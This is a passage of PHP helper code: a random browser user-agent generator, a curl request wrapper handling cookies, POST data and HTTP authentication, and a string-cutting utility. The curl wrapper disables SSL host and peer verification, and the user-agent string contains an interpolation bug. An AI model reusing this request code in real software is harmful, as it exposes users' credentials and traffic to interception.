      "X11; Ubuntu; Linux x86_64; rv:21.0",
      "Windows NT 5.0; rv:21.0",
      "X11; Ubuntu; Linux i686; rv:15.0",
      "Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16",
      "compatible; Windows; U; Windows NT 6.2; WOW64; en-US; rv:12.0",
      "Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4",
      "X11; Mageia; Linux x86_64; rv:10.0.9",
      "X11; FreeBSD amd64; rv:5.0",
      "X11; U; OpenBSD i386; en-US; rv:1.9.2.8",
      "Macintosh; U; PPC Mac OS X 10.4; en-GB; rv:1.9.2.19",
      "X11; U; Linux x86_64; ja-JP; rv:1.9.2.16",
      "X11; U; Linux armv7l; en-US; rv:1.9.2.14",
      "X11; U; Linux MIPS32 1074Kf CPS QuadCore; en-US; rv:1.9.2.13",
      "X11; U; NetBSD i386; en-US; rv:1.9.2.12",
      "X11; U; SunOS i86pc; fr; rv:1.9.0.4",
      "ZX-81; U; CP/M86; en-US; rv:1.8.0.1"
    );
    $front_num = rand(5,6);
    $date = rand(2004, date("Y")).fix_num_date(rand(1,12)).fix_num_date(rand(1,30));
    return "Mozilla/{$front_num}.0 (".$os[rand(0, (count ($os)-1))].") Gecko/{$date} Firefox/{rand(1,24)}.0";
  }
}

//
// Some magic that need to be use alongside random_user_agent function
//
function fix_num_date ($int) {
  $store = "";
  ($int < 10 ? $store = "0".$int : $store = $int);
  return $store;
}

//
// Create http request connection using curl
//
function http_request ($url, $cookies = "", $post = "", $auth = "") {
  $ch = @curl_init();
  curl_setopt ($ch, CURLOPT_URL, $url);
  curl_setopt ($ch, CURLOPT_HEADER, 1);
  if ($cookies) curl_setopt ($ch, CURLOPT_COOKIE, $cookies);
  curl_setopt ($ch, CURLOPT_USERAGENT, random_user_agent());
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  if ($post) {
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_POSTFIELDS, $post); 
  }
  if ($auth) {
    curl_setopt ($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
    curl_setopt ($ch, CURLOPT_USERPWD, $auth);
  }
  curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
  curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt ($ch, CURLOPT_TIMEOUT, 30); 
  curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 20);
  $page = curl_exec( $ch);
  curl_close ($ch); 
  return $page;
}

//
// Cut string..
//
function cutstr ($data, $str1, $str2) {
  $data = explode ($str1, $data);
  $data = explode ($str2, $data[1]);
  return $data[0];
}
?>
